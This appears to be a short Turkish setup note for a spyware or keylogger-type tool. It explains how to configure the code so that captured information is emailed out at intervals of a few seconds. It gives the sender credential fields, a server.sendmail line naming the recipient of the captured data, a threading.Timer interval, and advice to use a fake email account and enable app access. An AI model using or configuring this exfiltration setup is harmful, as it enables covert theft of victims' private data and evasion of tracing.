PROGRAMI ÇALIŞTIRMADAN ÖNCE ŞU ALANLARI DÜZENLEYİNİZ(ÖNERİ SAHTE BİR MAİL ADRESİ AÇIN)

1'İNCİ ALAN ARACIN GÖNDERİM YAPACAĞI MAİL ADRESİ BİLGİLERİ : 
sender_emmail = "mail@gmail.com" //Gönderim yapacak mail adresi
sender_password = "password" //Mail Şifresi
2'İNCİ ALAN ARACIN YAKALADIĞI BİLGİLERİ GÖNDERECEĞİ MAİL ADRESİNİ YAZINIZ:
server.sendmail("Gönderim Yapacak Mail Adresi","Gönderilecek Mail Adresi",mesaj)
MAİL ŞİFESİNİ GİRDİĞİNİZDE ÇALIŞMAYABİLİR BUNUN İÇİN İLK ÖNCE AÇTIĞINIZ MAİL ADRESİNE GİDİP İKİ FAKTÖRLÜ AÇIP ORADAN UYGULAMA ERİŞİMİNİ AKTİF EDİNİZ.
3'ÜNCÜ ALAN KAÇ SANİYE ARALIKLA GÖNDERİLECEĞİNİ BELİRLEYİN:
timer = threading.Timer(5,dallanma) // Kaç Saniye aralıkla gönderim yapılacağını belirleyiniz öneri 5 10 sn
